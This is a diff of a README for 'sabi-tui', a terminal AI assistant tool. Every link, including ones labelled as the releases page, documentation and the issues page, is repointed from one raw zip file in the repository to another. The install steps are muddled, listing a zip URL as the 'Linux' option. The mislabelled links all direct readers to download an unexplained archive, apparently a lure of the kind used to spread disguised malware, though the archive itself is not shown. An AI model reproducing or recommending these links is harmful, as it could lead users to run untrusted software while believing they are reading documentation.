@@ -1,7 +1,7 @@
 # 🤖 sabi-tui - Your AI Assistant for Terminal Tasks
 
 ## 🔗 Download Now
-[![Download sabi-tui](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip)](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip)
+[![Download sabi-tui](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip)](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip)
 
 ---
 
@@ -11,9 +11,9 @@ Welcome to sabi-tui! This terminal AI agent helps you execute shell commands, ru
 ## 📥 Download & Install
 To get started, you need to download the latest version of sabi-tui. 
 
-1. Visit this page to download: [sabi-tui Releases](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip).
+1. Visit this page to download: [sabi-tui Releases](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip).
 2. Click on the latest release.
-3. Choose the appropriate file for your system. Options typically include .exe for Windows, https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip for Linux, or .dmg for macOS.
+3. Choose the appropriate file for your system. Options typically include .exe for Windows, https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip for Linux, or .dmg for macOS.
 4. Follow the specific instructions for your operating system to install the application.
 
 ### 🖥️ System Requirements
@@ -41,7 +41,7 @@ Sabi-tui provides a user-friendly command-line interface tailored for ease of us
 4. Follow the on-screen instructions to execute commands or run scripts.
 
 ## 🌐 Community and Support
-Join our community on GitHub to stay updated, ask questions, and share your experiences. We welcome feedback on how to improve sabi-tui. Check the [issues page](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip) for known issues or to report a bug.
+Join our community on GitHub to stay updated, ask questions, and share your experiences. We welcome feedback on how to improve sabi-tui. Check the [issues page](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip) for known issues or to report a bug.
 
 ## 📄 License
 Sabi-tui is licensed under the MIT License. You are free to use, modify, and distribute the software, following the license terms.
@@ -50,9 +50,9 @@ Sabi-tui is licensed under the MIT License. You are free to use, modify, and dis
 Thank you to the contributors who have helped improve sabi-tui and the open-source community for its ongoing support.
 
 ## 🔗 Links
-- [sabi-tui Releases](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip) - Download the latest version.
-- [Documentation](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip) - In-depth guides and user manuals.
-- [Issues](https://raw.githubusercontent.com/Steff96/sabi-tui/main/examples/sabi-tui-Lombardic.zip) - Report bugs or request features.
+- [sabi-tui Releases](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip) - Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip) - In-depth guides and user manuals.
+- [Issues](https://raw.githubusercontent.com/Steff96/sabi-tui/main/src/tui_sabi_v2.1.zip) - Report bugs or request features.
 
 ---
 
